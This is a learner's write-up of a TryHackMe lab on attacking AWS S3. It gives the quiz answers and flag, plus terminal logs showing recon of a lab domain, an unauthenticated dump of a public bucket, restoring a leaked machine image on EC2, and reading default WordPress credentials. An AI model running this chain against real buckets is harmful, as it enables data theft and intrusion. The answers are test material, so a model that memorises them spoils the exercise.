<p align="center">May 13, 2025<br>
Hey there, fellow lifelong learner! IÂ´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and Iâ€™m genuinely excited to join you on this adventure.<br>
ItÂ´s part of my $$\textcolor{#FF69B4}{\textbf{373}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="https://github.com/user-attachments/assets/3e7f2867-802a-4bc8-9066-a37cc667909a" alt="Your Image Badge"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{AWS S3 - Attack and Defense}}$$</h1>
<p align="center"><em>An overview of security features and common attacks for the AWS S3 service.</em>.<br>
It is classified as a medium-level walkthrough.<br>
You can join it for ðŸ†“ using your own virtual machine with openVPN or TryHackMeÂ´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/awss3service"</a>here.</p>

<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/597ef441-7af4-466c-a221-ddd8a037fc1d"> </p>

<br>
<br>

<h2>Task 1 . Introduction</h2>
<h3>ï»¿S3 - A Versatile Service </h3>
<p>AWS S3 helped set AWS apart as a powerhouse in cloud computing. Being able to arbitrarily scale data storage and use it in interactions across AWS services has meant that S3 is deeply entangled in how almost all organizations use AWS. However, that power doesn't come without its own weaknesses - S3 is one of the most commonly abused services in AWS. During this room, you will learn key capabilities and attack surfaces of S3.</p>

<h3>Learning Objectives</h3>
<p>Students will learn basic S3 concepts, such as:<br>

- buckets<br>
- objects<br>
- ACLs<br>
- bucket policies<br><br>

Students will learn about common security issues related to public S3 buckets and how S3 buckets are used in automation. Finally, students will use this knowledge to attack an S3 bucket, exfiltrating data and using the data to further compromise an organization.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 1.1. <em>LetÂ´s get started!</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<br>

<h2>Task 2 . Accessing the environment</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 2.1. <em>Generate environment or set up your credentials</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

![image](https://github.com/user-attachments/assets/823c8278-eb38-4513-a790-e140af6ad073)

<br>

<h2>Task 3 . S3 Service Overview</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 3.1. <em>What is the name of the file storage container where you keep your data in S3?</em><br><a id='3.1'></a>
>> <code><strong>bucket</strong></code>

<br>

> 3.2. <em>What characteristic makes Bucket Policies preferable to ACLs in S3?</em><br><a id='3.2'></a>
>> <code><strong>human-readable-syntax</strong></code>

<br>
<br>

<h2>Task 4 . CloudFront Overview</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 4.1. <em>What are the CloudFront origins?</em><br><a id='4.1'></a>
>> <code><strong>The resource hosted behind CloudFront</strong></code>

<br>

<br>

<h2>Task 5 . Lab: Identifying Misconfigured CloudFront Distrubtions</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 5.1. <em>What are the two primary methods of identifying public S3 buckets?</em><br><a id='5.1'></a>
>> <code><strong>Search Engine Indexing and DNS Recon</strong></code>

<br>

> 5.2. <em>What subdomain did we identify by searching certificates at crt.sh?</em><br><a id='5.2'></a>
>> <code><strong>assets.bestcloudcompany.org</strong></code>

<br>

```bash
:~# nslookup bestcloudcompany.org
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	bestcloudcompany.org
Address: 44.203.62.152

:~# nslookup 44.203.62.152
152.62.203.44.in-addr.arpa	name = ec2-44-203-62-152.compute-1.amazonaws.com.

Authoritative answers can be found from:
```

<br>

```bash
:~# nslookup assets.bestcloudcompany.org
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	assets.bestcloudcompany.org
Address: 18.66.171.33
Name:	assets.bestcloudcompany.org
Address: 18.66.171.68
Name:	assets.bestcloudcompany.org
Address: 18.66.171.7
Name:	assets.bestcloudcompany.org
Address: 18.66.171.86

:~# nslookup 18.66.171.33
33.171.66.18.in-addr.arpa	name = server-18-66-171-33.dub56.r.cloudfront.net.

Authoritative answers can be found from:

:~# 
```

<br>

<p>Added <code>18.66.171.86</code> to <code>/etc/hosts</code>.</p>

<p>Navigated to <code>assets.bestcloudcompany.org</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/902f0578-945b-43b0-b0c0-cd0db43772c4)

<br>

<p>Googled <code>"bestcloudcompany.org" AND "s3.amazonaws.com"</code></p>

![image](https://github.com/user-attachments/assets/daa2b050-c767-4f09-8e1a-03d407f01e7b)

<br>

```bash
:~# nslookup assets.bestcloudcompany.org.org.s3.amazonaws.com
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
assets.bestcloudcompany.org.org.s3.amazonaws.com	canonical name = s3-1-w.amazonaws.com.
s3-1-w.amazonaws.com	canonical name = s3-w.us-east-1.amazonaws.com.
Name:	s3-w.us-east-1.amazonaws.com
Address: 52.217.104.36
Name:	s3-w.us-east-1.amazonaws.com
Address: 3.5.3.117
Name:	s3-w.us-east-1.amazonaws.com
Address: 16.15.185.155
Name:	s3-w.us-east-1.amazonaws.com
Address: 16.182.96.249
Name:	s3-w.us-east-1.amazonaws.com
Address: 52.217.199.241
Name:	s3-w.us-east-1.amazonaws.com
Address: 3.5.29.56
Name:	s3-w.us-east-1.amazonaws.com
Address: 3.5.30.235
Name:	s3-w.us-east-1.amazonaws.com
Address: 3.5.29.172
:~# 
```

<br>
<br>


<h2>Task 6 . Lab: Attacking Public S3 Buckets</h2>
<h3>Public S3 Buckets - A Long Historyï»¿</h3>
<p>As mentioned, a primary use case for S3 is to host public websites. While this is intended behavior by AWS design, it hasn't been without significant security breaches at AWS customers. In fact, customers were so commonly leaving sensitive data in open S3 buckets, AWS changed default behavior from allowing any bucket to be made public by default, to instituting a "Public Access Block" on all newly created S3 buckets across AWS customers. This "Public Access Block" became the default behavior in AWS accounts starting in November 2018.<br><br>

However, the control was not implemented retroactively. Any buckets or associated objects made public prior to November 2018 remain public. Furthermore, customers still make mistakes with S3 bucket permissions in spite of the Public Access Block - cloud security researcher Christophe Tafani-Dereeper found that in 2021, there were at least 22 publicly disclosed cybersecurity incidents involving public S3 buckets. </p>

<h3>Getting S3 Loot</h3>
<p>Even though S3 buckets often contain sensitive information, it doesn't mean that everything in a bucket is sensitive. Furthermore, while individual file  (or "objects") uploads are limited to 5 TB; buckets can be arbitrarily large. As an attacker, even if you find an open bucket - you may be searching through a proverbial needle in a haystack.</p>

<h3>Using AWS Utilities for Offense</h3>
<p>On your attack box, the AWS CLI comes pre-installed. If you are using your own machine, you can download and install the AWS CLI using this guide from AWS. Using the AWS CLI, enter the following command to dump the S3 bucket that you have found open:</p>

<p>[ ... ]</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 6.1. <em>What AWS CLI command can you run to dump an S3 bucket in its entirety?</em><br><a id='6.1'></a>
>> <code><strong>aws s3 sync</strong></code>

<br>

```bash
:~# aws configure
AWS Access Key ID [None]: AKIA***************
AWS Secret Access Key [None]: *********************************************************
Default region name [None]: us-east-1
Default output format [None]: json
```

<br>

```bash
:~# aws s3 sync s3://assets.bestcloudcompany.org . --no-sign-request
...
download: s3://assets.bestcloudcompany.org/index.html to ./index.html
download: s3://assets.bestcloudcompany.org/media/cdx_at_cga_1.jpg to media/cdx_at_cga_1.jpg
download: s3://assets.bestcloudcompany.org/media/cyber_cyber.jpeg to media/cyber_cyber.jpeg
download: s3://assets.bestcloudcompany.org/media/hacking_hacker_computer_internet.jpg to media/hacking_hacker_computer_internet.jpg
download: s3://assets.bestcloudcompany.org/media/cyber_guard_2016_1.jpg to media/cyber_guard_2016_1.jpg
download: s3://assets.bestcloudcompany.org/ami-056a6742115906e8c.bin to ./ami-056a6742115906e8c.bin
```

<br>

![image](https://github.com/user-attachments/assets/388fab17-be54-430a-9340-711b035d2ad3)

<br>

![image](https://github.com/user-attachments/assets/4e0e61ae-4763-4413-87e4-332038161150)

<br>

![image](https://github.com/user-attachments/assets/b9ef5023-27f9-462a-b062-3102fb8f4a89)



<br>
<br>


<h2>Task 7 . S3: AWS Service Substrate</h2>
<h3>S3: AWS Service Substrate</h3>
<p>While a primary use case for S3 is public websites - AWS intends for customers to use S3 for a variety of use cases on the AWS platform. CloudFormation templates and Lambda functions are stored in S3 by AWS whenever you provision CloudFormation or Lambda resources. S3 is used to store CloudTrail logs, and if you so choose, CloudWatch logs, and a variety of other logs. AWS Athena is designed to be used with S3 to perform analytics in association with data stored in S3 buckets. The potential use cases are almost limitless.<br><br> 

This sometimes offers unique opportunities to attack other AWS services, simply by modifying the resources in a particular S3 bucket. For example, if you are able to modify a CloudFormation template stored in an S3 bucket, you may be able to trick an end user into deploying malicious resources on your behalf using the CloudFormation service.<br><br>

If you find a golden image pipeline, then compromising the base image would lead to a compromised golden image - potentially deployed widely across an organization. This sort of attack chain applies to a variety of AWS services and, given the prevalence of S3 as data storage for other AWS services, is something you should always consider when you determine you have write access to one or many S3 buckets.<br><br>

Now, let's take a look at that binary file and see what comes of it.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 7.1. <em>What use of S3 means that it can involve more than data exposure only (e.g., code execution, etc.)?</em><br><a id='7.1'></a>
>> <code><strong>AWS Service Substrate</strong></code>

<br>
<br>


<h2>Task 8 . Lab: S3 - Abusing the Substrate</h2>
<h3>EC2 and S3 - A Common Pair of Key Services</h3>
<p>EC2 is an AWS virtual server offering and one of AWS's most widely used services. While this room is not geared towards teaching you EC2 (see the Amazon EC2 - Attack and Defense room for EC2), EC2 is still going to play an important role in this lab. You see, that .bin file that you found with the weird file name? It turns out that it is an EC2 virtual machine image, known as an Amazon Machine Image (AMI). While most organizations will restrict access and deploy purpose-built S3 buckets to store AMIs, Best Cloud Company has decided to store a backup image in the same bucket that hosts the website - I mean, why not? It is the same image used to host the non-static resources associated with the company's WordPress site.</p>

<h3>Pilfering the Image</h3>
<p>Before starting our pilfering adventure, we configure AWS CLI using the aws configure command on the AttackBox. We'll specify the AWS Access Key ID and AWS Secret Access Key credentials available by clicking on the orange Cloud Details button in the room, and specifying the Default Region Name as us-east-1.<br><br>

Now that we've determined the nature of our loot - how do we use it to further our access? Well, you can use the following AWS CLI command to restore the image:</p>

<p>[ ... ]</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 8.1. <em>What service uses Amazon Machine Images and often uses S3 as storage for the images?</em><br><a id='8.1'></a>
>> <code><strong>EC2</strong></code>

<br>

> 8.2. <em>What is the username for the default WordPress user on the AMI we identified?</em><br><a id='8.2'></a>
>> <code><strong>user</strong></code>

<br>

> 8.3. <em>What is the password for the default WordPress user on the AMI we identified?</em><br><a id='8.3'></a>
>> <code><strong>nd4lR0IQ43Hd</strong></code>

<br>

> 8.4. <em>What is the flag in the WordPress profile of the user?</em><br><a id='8.4'></a>
>> <code><strong>47e94f90-cbb7-4c6a-aacc-f6ff765dc54a</strong></code>

<br>
<br>

<p>Discovered in previous task: <code>ami-056a6742115906e8c.bin</code></p>

```bash
:~/AWS-S3-Attack-and-Defense# aws ec2 create-restore-image-task --object-key ami-056a6742115906e8c.bin --bucket assets.bestcloudcompany.org --name 5242025ro --region us-east-1
{
    "ImageId": "ami-00b2c8b4d78d55286"
}
:~/AWS-S3-Attack-and-Defense# aws ec2 create-key-pair --key-name my --query "KeyMaterial" --output text > my.pem
:~/AWS-S3-Attack-and-Defense# aws ec2 describe-subnets > subnetsinfo
:~/AWS-S3-Attack-and-Defense# cat subnetsinfo | grep SubnetId
            "SubnetId": "subnet-026329a4e5b98cb69",
:~/AWS-S3-Attack-and-Defense# aws ec2 describe-security-groups > securityginfo
:~/AWS-S3-Attack-and-Defense# cat securityginfo | grep Description
            "Description": "Allow SSH Access for TryHackMe S3 Room",
            "Description": "default VPC security group",
:~/AWS-S3-Attack-and-Defense# cat securityginfo | grep sg
            "GroupId": "sg-03a0b9ee397718daa",
                            "GroupId": "sg-0165e4491e3879efb",
            "GroupId": "sg-0165e4491e3879efb",
:~/AWS-S3-Attack-and-Defense# 
:~/AWS-S3-Attack-and-Defense# aws ec2 run-instances --image-id ami-008edc9d45878c631 --instance-type t3a.micro --key-name key --subnet-id subnet-026329a4e5b98cb69 --security-group-id sg-03a0b9ee397718daa
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-008edc9d45878c631",
            "InstanceId": "i-0dc50d42ee7762fbb",
            "InstanceType": "t3a.micro",
            "KeyName": "key",
            "LaunchTime": "2025-05-24T18:49:23+00:00",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1a",
                "GroupName": "",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-10-0-0-202.ec2.internal",
            "PrivateIpAddress": "10.0.0.202",
            "ProductCodes": [],
            "PublicDnsName": "",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
            "StateTransitionReason": "",
            "SubnetId": "subnet-026329a4e5b98cb69",
            "VpcId": "vpc-0c3811a272f3a0647",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [],
            "ClientToken": "81cbee62-8613-46af-acef-5ca117efd553",
            "EbsOptimized": false,
            "EnaSupport": true,
            "Hypervisor": "xen",
            "NetworkInterfaces": [
                {
                    "Attachment": {
                        "AttachTime": "2025-05-24T18:49:23+00:00",
                        "AttachmentId": "eni-attach-0f5b032aaf0745b45",
                        "DeleteOnTermination": true,
                        "DeviceIndex": 0,
                        "Status": "attaching",
                        "NetworkCardIndex": 0
                    },
                    "Description": "",
                    "Groups": [
                        {
                            "GroupName": "StackSet-attacking-s3-a342a8cb-e79f-43a1-b289-63f029c130fb-SecurityGroup-N7UZ4Apxch2A",
                            "GroupId": "sg-03a0b9ee397718daa"
                        }
                    ],
                    "Ipv6Addresses": [],
                    "MacAddress": "12:7a:b7:af:93:b3",
                    "NetworkInterfaceId": "eni-0da871ad469849426",
                    "OwnerId": "551334172628",
                    "PrivateDnsName": "ip-10-0-0-202.ec2.internal",
                    "PrivateIpAddress": "10.0.0.202",
                    "PrivateIpAddresses": [
                        {
                            "Primary": true,
                            "PrivateDnsName": "ip-10-0-0-202.ec2.internal",
                            "PrivateIpAddress": "10.0.0.202"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-026329a4e5b98cb69",
                    "VpcId": "vpc-0c3811a272f3a0647",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "StackSet-attacking-s3-a342a8cb-e79f-43a1-b289-63f029c130fb-SecurityGroup-N7UZ4Apxch2A",
                    "GroupId": "sg-03a0b9ee397718daa"
                }
            ],
            "SourceDestCheck": true,
            "StateReason": {
                "Code": "pending",
                "Message": "pending"
            },
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 2
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "pending",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "EnclaveOptions": {
                "Enabled": false
            },
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            }
        }
    ],
    "OwnerId": "551334172628",
    "ReservationId": "r-01ed99f7835bf6cb2"
}

:~/AWS-S3-Attack-and-Defense#
:~/AWS-S3-Attack-and-Defense# ssh -i key.pem root@Public_IP
...
Please login as the user "bitnami" rather than the user "root".
...
:~/AWS-S3-Attack-and-Defense#

:~/AWS-S3-Attack-and-Defense# ssh -i key.pem bitnami@PublicIP
...
       ___ _ _                   _
      | _ |_) |_ _ _  __ _ _ __ (_)
      | _ \ |  _| ' \/ _` | '  \| |
      |___/_|\__|_|_|\__,_|_|_|_|_|
  
...
bitnami@ip-10-0-0-202:~$



bitnami@ip-10-0-0-202:~$ ls
bitnami_credentials  htdocs  stack
bitnami@ip-10-0-0-202:~$ cat bitnami_credentials
Welcome to the WordPress packaged by Bitnami

******************************************************************************
The default username and password is 'user' and 'nd4lR0IQ43Hd'.
******************************************************************************

You can also use this password to access the databases and any other component the stack includes.

Please refer to https://docs.bitnami.com/ for more details.

bitnami@ip-10-0-0-202:~$ 
```

<br>

![image](https://github.com/user-attachments/assets/3283d8ba-b899-4fea-8cfb-dcf72543657e)

<br>


<p><code>user</code></p>

<p>https://docs.bitnami.com/vmware-marketplace/faq/get-started/find-credentials/</p>


![image](https://github.com/user-attachments/assets/4462d37e-24ee-438a-97e6-25b9194ad394)

<br>

<p><code>user</code>:<code>nd4lR0IQ43Hd</code></p>

<br>

![image](https://github.com/user-attachments/assets/2a07379a-1593-4a3f-b2ac-3a944e3ba2ed)

<br>

<p>Navigated to <code>bestcloudcompany.org</code>.</p>

![image](https://github.com/user-attachments/assets/25212d09-ff68-4570-9645-04b364d0c4c9)

<br>

<p>Navigated to <code>bestcloudcompany.org/wp-login.php</code>.</p>


![image](https://github.com/user-attachments/assets/29d0dfbb-9dc9-4eff-8e78-d8f211ca8abc)


<br>
<br>

<h2>Task 9 .Summary</h2>

<h3>ï»¿S3 Summary</h3>
<p>S3 is a critical service for AWS customers and as you see - compromising S3 can have devastating consequences. During this room, you've learned about the key concepts and terms associated with S3. Surveying common security weaknesses associated with the use of S3, we gained an understanding of how attackers may use S3, culminating in our own abuse of S3 and compromise of WordPress database credentials.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 9.1. <em>Continue learning AWS Cloud!</em><br><a id='9.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Room Complete}}$$</h1>

![image](https://github.com/user-attachments/assets/01664c46-283e-48be-be15-1e3930b2ce23)

<br>

![image](https://github.com/user-attachments/assets/2eda61bb-e812-459e-87c5-010f8fe1be2a)

<br>
<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |   Global     |   Brazil     |   Global    |   Brazil   |          | Completed |           |
| May 14, 2025      | 373      |    227áµ—Ê°     |        5áµ—Ê°   |   242nd     |    5áµ—Ê°    |  101,967 |       723|   62      |

</div>

![image](https://github.com/user-attachments/assets/f0a838a5-bc03-433c-8d40-10bb88d8b805)

<br>

![image](https://github.com/user-attachments/assets/5a1bd886-486a-4ee8-83e2-77a828613f4a)

<br>

![image](https://github.com/user-attachments/assets/a945a064-0dc4-4821-bfd2-36c3ec4807e2)

<br>

![image](https://github.com/user-attachments/assets/f0a439c1-bde5-4952-84b4-3f920bb0e9be)



